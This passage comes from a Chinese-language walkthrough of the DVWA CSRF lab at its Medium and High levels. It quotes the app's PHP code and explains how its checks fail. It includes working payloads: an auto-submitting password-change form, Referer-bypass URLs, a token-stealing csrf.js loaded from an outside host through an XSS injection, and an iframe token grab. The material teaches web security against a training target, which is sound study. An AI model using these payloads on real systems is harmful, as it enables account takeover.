            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// Issue with passwords matching</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// Didn't come from a trusted source</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>关键代码如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li><code>$_SERVER[ 'HTTP_REFERER' ]</code>: 这是一个 HTTP 请求头，它包含了当前请求的来源页面的 URL。</li>
<li><code>$_SERVER[ 'SERVER_NAME' ]</code>: 这是当前服务器的主机名。</li>
</ol>
<p>这里判断用户访问该网站的来源地址是否与网站的host相同，如果不相同这说明来源有问题。如果一致，则认为是真正的用户，接着更新密码，同时拒绝了SQL注入。同时这关放弃了token的检验</p>
<p>这里就是考察我们对于<code>stripos</code>的理解了，由于该函数只是判断待查询字符串是否<strong>包含</strong>指定的字符，这意味着我们造构造恶意网址的时候，只需要在网址中包含与正确网站的host_name相同的部分即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111205025972.png" alt="image-20240111205025972"></p>
<p>首先精心构造一个HTML页面</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>CSRF<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/dvwa/vulnerabilities/csrf/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password_new<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123456<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password_conf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123456<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>change<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123456<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token string">'csrf'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当用户访问该页面的时候由于<code>&lt;script&gt;document.forms['csrf'].submit();&lt;/script&gt;</code>的执行，导致用户自动提交给了上面表单内容，进行密码的修改。</p>
<p>接下来就是对于该html页面网址的构造了</p>
<p>**目录混淆：**将上述 html 页面放到服务器的 <code>127.0.0.1</code> 目录下，然后让用户访问自动触发提交然后访问构造好的 payload 地址：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.sqlsec.com/127.0.0.1/csrf.html</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>**文件名混淆：**将上述 html 文件重命名为 <code>127.0.0.1.html</code>，然后访问如下 payload：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.sqlsec.com/127.0.0.1.html</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里有师傅提醒：<strong>这里有一个小细节，如果目标网站是 http 的话，那么 csrf 的这个 html 页面也要是 http 协议，如果是 https 协议的话 就会失败，具体自行测试。</strong></p>
<p><strong>？拼接混淆referer</strong>：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.sqlsec.com/csrf.html?127.0.0.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>因为？后默认当做参数传递，这里因为 html 页面是不能接受参数的，所以随便输入是不影响实际的结果的，利用这个特点来绕过 referer 的检测。</p>
<h2 id="High-3">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"CONTENT_TYPE"</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CONTENT_TYPE'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"application/json"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$request_type</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"json"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"HTTP_USER_TOKEN"</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password_new"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password_conf"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Change"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_TOKEN'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password_new"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password_conf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$change</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user_token"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password_new"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password_conf"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Change"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user_token"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password_new"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password_conf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$change</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这串代码主要是判断用户传入的数据是否为json类型，如果是的话，进行json解密传给data，接着判断是否存在四个指定的变量，如果存在，则各自赋值。如果不是json数据类型，则仍然判断是否存在这四个变量，如果存在则分别赋值</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$change</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Check Anti-CSRF token</span>
    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// Do the passwords match?</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// They do!</span>
        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span> <span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$pass_new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Update the database</span>
        <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE `users` SET password = '"</span> <span class="token operator">.</span> <span class="token variable">$pass_new</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"' WHERE user = '"</span> <span class="token operator">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Feedback for the user</span>
        <span class="token variable">$return_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Password Changed."</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// Issue with passwords matching</span>
        <span class="token variable">$return_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Passwords did not match."</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request_type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"json"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">print</span> <span class="token function">json_encode</span> <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Message"</span> <span class="token operator">=&gt;</span><span class="token variable">$return_message</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;"</span> <span class="token operator">.</span> <span class="token variable">$return_message</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/pre&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里显示检查了用户token是否与session匹配，然后判断两次密码输入是否一致，如果一致则直接进行密码的更新，同时防止了SQL注入的可能。</p>
<p>很明显这里并不能有效的阻止CSRF的存在，只要我们想办法可以获取到用户的token即可成功攻击。</p>
<h3 id="JS发起HTTP-CSRF请求">JS发起HTTP CSRF请求</h3>
<p>新建一个csrf.js文件：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 首先访问这个页面 来获取 token</span>
<span class="token keyword">var</span> tokenUrl <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/dvwa/vulnerabilities/csrf/'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"Microsoft.XMLHTTP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
xmlhttp<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
xmlhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span><span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xmlhttp<span class="token punctuation">.</span>status<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
          <span class="token comment">// 使用正则提取 token</span>
        <span class="token keyword">var</span> text <span class="token operator">=</span> xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>
        <span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">user_token\' value\=\'(.*?)\' \/\&gt;</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> match <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> token <span class="token operator">=</span> match<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token comment">// 发起 CSRF 请求 将 token 带入</span>
        <span class="token keyword">var</span> new_url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/dvwa/vulnerabilities/csrf/?user_token='</span><span class="token operator">+</span>token<span class="token operator">+</span><span class="token string">'&amp;password_new=123456&amp;password_conf=123456&amp;Change=Change'</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>count<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            count<span class="token operator">++</span><span class="token punctuation">;</span>
            xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span>new_url<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span>tokenUrl<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将这个 csrf.js 上传到外网的服务器上，<code>http://your-website/csrf.js</code>，随后访问dvwa的xss high级别，插入恶意js代码</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;script src="http://your-website/csrf.js"&gt;&lt;/script&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里直接通过 script 标签的 src 来引入外部 js，访问之后此时密码就被更改为 123456 了</p>
<p>另外这里学习了国光师傅的另一种思路：</p>
<h3 id="常规-HTML-发起-CSRF-请求">常规 HTML 发起 CSRF 请求</h3>
<p>假设攻击者这里可以将 HTML 保存上传到 CORS 的跨域白名单下的话，那么这里也可以通过 HTML 这种组合式的 CSRF 攻击。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> token <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"get_token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'user_token'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value
    document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'user_token'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token operator">=</span>token<span class="token punctuation">;</span>
    <span class="token function">alert</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"csrf"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/dvwa/vulnerabilities/csrf/<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get_token<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/dvwa/vulnerabilities/csrf/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password_new<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123456<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password_conf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123456<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
